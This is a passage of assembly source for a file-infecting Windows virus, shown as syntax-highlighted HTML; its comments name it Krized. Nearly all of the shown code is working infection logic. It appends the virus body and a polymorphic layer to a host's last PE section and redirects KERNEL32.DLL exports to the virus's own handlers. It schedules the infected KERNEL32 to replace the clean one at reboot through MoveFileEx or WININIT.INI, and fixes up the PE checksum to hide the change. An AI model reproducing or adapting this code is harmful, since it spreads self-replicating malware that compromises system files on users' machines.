        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">Infected_Size</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ESI</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">PAGE_READWRITE</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ESI</span><span class="sc0">                     </span><span class="sc1">; Standard security.</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">File_Handle</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">ixCreateFileMappingA</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">03h</span><span class="sc0">

        </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">Restore_Stamp</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">Map_Handle</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">

        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ESI</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ESI</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ESI</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">FILE_MAP_WRITE</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">Map_Handle</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">ixMapViewOfFile</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">03h</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">Map_Address</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">

        </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">                </span><span class="sc1">; Error?</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">Close_Mapping</span><span class="sc0">

        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">                </span><span class="sc1">; Base of mapped candidate.</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">+</span><span class="sc2">3Ch</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; PE-header of our candidate.</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc0">

        </span><span class="sc6">MOVZX</span><span class="sc0">   </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EBX.Object_Count</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Calculate offset of last</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc0">                     </span><span class="sc1">; object-header.</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc2">40</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">MUL</span><span class="sc0">     </span><span class="sc8">ECX</span><span class="sc0">

        </span><span class="sc1">; Size of formatted header.</span><span class="sc0">

        </span><span class="sc6">MOVZX</span><span class="sc0">   </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EBX.NT_Header_Size</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBX</span><span class="sc4">+</span><span class="sc2">24</span><span class="sc4">+</span><span class="sc8">EDX</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EDI</span><span class="sc0">                     </span><span class="sc1">; Start object-headers.</span><span class="sc0">

        </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">                </span><span class="sc1">; Last object-header.</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EDI.Section_Physical_Size</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">

        </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Virus_Size</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Poly_Size</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EBX.File_Align</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Align_EAX</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">

        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">EDI.Section_Physical_Size</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">

        </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EDI.Section_RVA</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EDI.Section_Virtual_Size</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">Virus_Size</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Poly_Size</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EBX.Object_Align</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">Calc_Virt_Size</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Align_EAX</span><span class="sc0">

        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">      </span><span class="sc5">Calc_Virt_Size</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">EDI.Section_Virtual_Size</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">

        </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EDI.Section_RVA</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">EBX.Image_Size</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">

        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc0">

        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">ECX</span><span class="sc0">

        </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EDI.Section_Physical_Offset</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">Map_Address</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">

        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">EBX.EIP_RVA</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">

        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Poly_Engine</span><span class="sc0">                     </span><span class="sc1">; Lame poly-layer.</span><span class="sc0">

        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">EDX</span><span class="sc0">

</span><span class="sc1">; Krized used to add a new section to the host, but unfortunately most NT</span><span class="sc0">
</span><span class="sc1">; files (including K32) don't have room for an extra object-header, this</span><span class="sc0">
</span><span class="sc1">; more or less forced me to use the append-to-the-last-section-method,</span><span class="sc0">
</span><span class="sc1">; which could technically cause instabilities.</span><span class="sc0">

        </span><span class="sc1">; Readable/writeable/shareable.</span><span class="sc0">

        </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EDI.Section_Flags</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">11010000b</span><span class="sc0">

        </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0">

        </span><span class="sc1">; We're infecting KERNEL32.DLL ?</span><span class="sc0">

        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">Infect_Mode</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">Init_Succesful</span><span class="sc0">

        </span><span class="sc1">; Screw K32's build-time to force the loader</span><span class="sc0">
        </span><span class="sc1">; to patch executable's bound imports with our</span><span class="sc0">
        </span><span class="sc1">; hooked API-addresses in K32's export-table,</span><span class="sc0">
        </span><span class="sc1">; instead of using hardcoded addresses.</span><span class="sc0">

        </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">EBX.PE_Date_Time</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc1">; Notify DLL of PROCESS_ATTACH, this is always</span><span class="sc0">
        </span><span class="sc1">; done regardless of these flags, but I rather</span><span class="sc0">
        </span><span class="sc1">; waste some bytes playing safe.</span><span class="sc0">

        </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EBX.DLL_Flags</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">00000001b</span><span class="sc0">

        </span><span class="sc1">; Now change the exports of K32 to point</span><span class="sc0">
        </span><span class="sc1">; to the virus' own handlers.</span><span class="sc0">

        </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">Hook_Exports</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">

        </span><span class="sc6">CLD</span><span class="sc0">

</span><span class="sc5">Hook_Export</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">LODSD</span><span class="sc0">                           </span><span class="sc1">; Get array entry in export.</span><span class="sc0">

        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">

                </span><span class="sc1">; Convert the RVA to a physical address.</span><span class="sc0">

</span><span class="sc5">Find_RVA</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EDX.Section_RVA</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EDX.Section_Virtual_Size</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">                </span><span class="sc1">; RVA is in section's space?</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">      </span><span class="sc5">Calculate_Phys</span><span class="sc0">

        </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40</span><span class="sc0">                 </span><span class="sc1">; Next section.</span><span class="sc0">

        </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">Find_RVA</span><span class="sc0">

</span><span class="sc5">Calculate_Phys</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EDX.Section_RVA</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EDX.Section_Physical_Offset</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">MOVZX</span><span class="sc0">   </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">Dispatch_API</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)+(</span><span class="sc8">ECX</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">)]</span><span class="sc0">

        </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">New_Virus_RVA</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">

        </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">Map_Address</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">
        </span><span class="sc6">STOSD</span><span class="sc0">

</span><span class="sc5">Cont_Hook_Loop</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">ECX</span><span class="sc0">

        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Hook_API_Count</span><span class="sc0">      </span><span class="sc1">; Did 'em all?</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">      </span><span class="sc5">Hook_Export</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">Global_Handle</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">

        </span><span class="sc1">; Attemp to register a file-update to replace the</span><span class="sc0">
        </span><span class="sc1">; original KERNEL32.DLL with the infected one at</span><span class="sc0">
        </span><span class="sc1">; the next boot-up.</span><span class="sc0">

        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">MOVEFILE_DELAY_UNTIL_REBOOT</span><span class="sc0"> </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc5">MOVEFILE_REPLACE_EXISTING</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">+(</span><span class="sc5">Clean_K32_Path</span><span class="sc4">-</span><span class="sc5">Virus_End</span><span class="sc4">)]</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">+(</span><span class="sc5">Infected_K32_Path</span><span class="sc4">-</span><span class="sc5">Virus_End</span><span class="sc4">)]</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">ixMoveFileExA</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">03h</span><span class="sc0">

                </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">                </span><span class="sc1">; Successful?</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">Init_Succesful</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">ixGetLastError</span><span class="sc0">          </span><span class="sc1">; Get extended error-</span><span class="sc0">
                </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">03h</span><span class="sc0">                     </span><span class="sc1">; information.</span><span class="sc0">

                </span><span class="sc1">; Access denied or function not available?</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ERROR_ACCESS_DENIED</span><span class="sc0">
                </span><span class="sc6">JE</span><span class="sc0">      </span><span class="sc5">Unmap_View</span><span class="sc0">

        </span><span class="sc1">; Else do it the Win9x-way...</span><span class="sc0">

        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">@2</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'WININIT.INI'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">@2</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">+(</span><span class="sc5">Infected_K32_Path</span><span class="sc4">-</span><span class="sc5">Virus_End</span><span class="sc4">)]</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">+(</span><span class="sc5">Clean_K32_Path</span><span class="sc4">-</span><span class="sc5">Virus_End</span><span class="sc4">)]</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">@3</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'rename'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">@3</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">ixWritePrivateProfileStringA</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">03h</span><span class="sc0">

        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">                </span><span class="sc1">; Fuck, user doesn't seem</span><span class="sc0">
        </span><span class="sc6">JECXZ</span><span class="sc0">   </span><span class="sc5">Unmap_View</span><span class="sc0">              </span><span class="sc1">; to have admin-priviliges.</span><span class="sc0">

</span><span class="sc5">Init_Succesful</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">Clear_Tracks_Sw</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">Free_Global_M</span><span class="sc4">-</span><span class="sc5">Clear_Tracks_Sw</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">

        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">Infect_Mode</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">Test_Checksum</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">Clear_Tracks_Sw</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">Reboot_Test</span><span class="sc4">-</span><span class="sc5">Clear_Tracks_Sw</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">

</span><span class="sc5">Test_Checksum</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">EBX.PE_Checksum</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc0">  </span><span class="sc1">; This file is checksummed?</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">Unmap_View</span><span class="sc0">

    </span><span class="sc1">; Check out CheckSumMappedFile and notice how it uses an</span><span class="sc0">
    </span><span class="sc1">; entirely different algorithm, as usual, weird stuph..</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">EBX.PE_Checksum</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">Map_Address</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">Infected_Size</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">

        </span><span class="sc6">SHR</span><span class="sc0">     </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                  </span><span class="sc1">; Words.</span><span class="sc0">

</span><span class="sc5">Checksum_Loop</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">MOVZX</span><span class="sc0">   </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc0">

        </span><span class="sc6">AND</span><span class="sc0">     </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFh</span><span class="sc0">             </span><span class="sc1">; Convert to 16-bit word.</span><span class="sc0">
        </span><span class="sc6">SHR</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">

        </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc0">

        </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">Checksum_Loop</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc0">

        </span><span class="sc6">SHR</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">

        </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">

        </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">Infected_Size</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">EBX.PE_Checksum</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">

</span><span class="sc5">Unmap_View</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">Map_Address</span><span class="sc0">     </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">ixUnmapViewOfFile</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">03h</span><span class="sc0">

